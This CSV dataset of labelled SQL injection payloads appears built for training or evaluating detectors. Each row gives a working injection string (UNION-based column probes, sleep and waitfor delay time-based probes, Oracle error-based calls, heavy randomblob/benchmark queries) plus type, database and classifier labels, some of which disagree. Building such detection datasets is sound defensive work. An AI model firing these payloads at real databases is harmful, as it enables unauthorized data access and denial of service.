payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1' ) and elt ( 4249 = 4249,7259 ) and ( 'bkag' = 'bkag",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1215,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' ) and elt ( 4249 = 4249,7259 ) and ( 'bkag' = 'bkag"
"1' ) ) as xebq where 7959 = 7959 union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1216,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) as xebq where 7959 = 7959 union all select null,null,null,null,null,null#"
1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ),boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,1217,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) )
"1%"" union all select null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1218,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" union all select null,null#"
-8328 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # rlva,boolean_blind,generic,0.8,IN with char for blind,KEEP,,boolean_blind,generic,1219,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-8328 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # rlva
"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION in boolean mode for union-based,KEEP,,union_based,generic,1220,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null,null--"
"1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ""dyoe"" = ""dyoe",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1221,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ""dyoe"" = ""dyoe"
1%' ) or sleep ( 5 ) and ( '%' = ',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1222,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1%' ) or sleep ( 5 ) and ( '%' = '
"1 ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 5030 = 5030",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1223,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1 ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 5030 = 5030"
"-8868"" ) where 5681 = 5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1224,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8868"" ) where 5681 = 5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--"
"1' ) ) as fwhv where 3921 = 3921 union all select null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1225,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) as fwhv where 3921 = 3921 union all select null,null--"
1%' ) and 4061 = 2730#,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1226,boolean_blind,generic,Pattern match: 'and 4061 = 2730' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1%' ) and 4061 = 2730#
"-3215"" ) union all select 4457,4457,4457,4457,4457#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1227,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3215"" ) union all select 4457,4457,4457,4457,4457#"
"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'ndhn' like 'ndhn",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,1228,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'ndhn' like 'ndhn"
"1"" ) where 2764 = 2764 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,1229,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) where 2764 = 2764 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --"
"1%"" ) union all select null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1230,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) union all select null,null,null,null#"
1 ) ) rlike ( select ( case when ( 6113 = 1222 ) then 1 else 0x28 end ) ) and ( ( 2815 = 2815,boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,1231,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) rlike ( select ( case when ( 6113 = 1222 ) then 1 else 0x28 end ) ) and ( ( 2815 = 2815
-5449' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'ryvy' like 'ryvy,error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,1232,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,-5449' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'ryvy' like 'ryvy
"1' ) as bfgl where 8959 = 8959 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1233,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) as bfgl where 8959 = 8959 union all select null,null,null,null,null,null,null,null,null,null--"
"-7795"" ) where 1712 = 1712 union all select 1712,1712,1712,1712#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1234,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7795"" ) where 1712 = 1712 union all select 1712,1712,1712,1712#"
"iif ( 3760 = 4785,1,1/0 )",boolean_blind,mssql,0.85,iif() for MSSQL boolean blind,KEEP,,boolean_blind,mssql,1235,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"iif ( 3760 = 4785,1,1/0 )"
select ( case when ( 4061 = 1396 ) then 4061 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,1236,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 4061 = 1396 ) then 4061 else 1/ ( select 0 ) end ) --
"1%"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""%"" = """,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1237,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1%"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""%"" = """
1'|| ( select 'vuku' where 3143 = 3143 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay for time blind,KEEP,,time_blind,mssql,1238,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1'|| ( select 'vuku' where 3143 = 3143 waitfor delay '0:0:5'--
"-8026 or elt ( 8434 = 4516,4516 ) # bsqo",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1239,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-8026 or elt ( 8434 = 4516,4516 ) # bsqo"
"1"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1240,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
select pg_sleep ( 5 ) # pjvi,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1241,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) # pjvi
"1' union all select null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1242,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' union all select null,null#"
"1' ) as siyk where 1514 = 1514 union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1243,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) as siyk where 1514 = 1514 union all select null,null,null,null,null,null#"
"1' in boolean mode ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,1244,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' in boolean mode ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) #"
"1'+ ( select sfmz where 4870 = 4870 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1245,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1'+ ( select sfmz where 4870 = 4870 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"-9183"" ) as wctu where 2058 = 2058 or 3038 = 3038",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1246,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-9183"" ) as wctu where 2058 = 2058 or 3038 = 3038"
"1"" where 9135 = 9135 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1247,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" where 9135 = 9135 and elt ( 4249 = 4249,7259 ) --"
"1 ) where 5012 = 5012 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1248,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) where 5012 = 5012 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --"
"-2377%' ) ) ) union all select 7706,7706--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1249,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2377%' ) ) ) union all select 7706,7706--"
"1"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1250,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'pwuy' = 'pwuy",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1251,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'pwuy' = 'pwuy"
1%' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = ',boolean_blind,generic,0.8,IN with char for blind,KEEP,,boolean_blind,generic,1252,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1%' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '
1' ) as mpsf where 3348 = 3348,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1253,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as mpsf where 3348 = 3348
"-9352"" ) ) ) or 3038 = 3038",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1254,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-9352"" ) ) ) or 3038 = 3038"
-8131' ) ) or 9680 = 3467,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1255,boolean_blind,generic,Pattern match: 'or 9680 = 3467' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8131' ) ) or 9680 = 3467
"-3729' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'czed' = 'czed",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,1256,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-3729' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'czed' = 'czed"
-2761 or 1144 = 7657-- mfml,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1257,boolean_blind,generic,Pattern match: 'or 1144 = 7657' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2761 or 1144 = 7657-- mfml
"-8971'|| ( select 'smyx' where 7970 = 7970 union all select 7970,7970,7970,7970,7970,7970,7970#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1258,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8971'|| ( select 'smyx' where 7970 = 7970 union all select 7970,7970,7970,7970,7970,7970,7970#"
-7103 ) ) or 4610 = 1871 and ( ( 1249 = 1249,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1259,boolean_blind,generic,Pattern match: 'or 4610 = 1871' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7103 ) ) or 4610 = 1871 and ( ( 1249 = 1249
"1' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1260,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --"
"1 ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9184 = 9184",boolean_blind,mssql,0.8,CONVERT for MSSQL blind,KEEP,,boolean_blind,mssql,1261,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9184 = 9184"
"1 ) where 1513 = 1513 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1262,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1 ) where 1513 = 1513 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
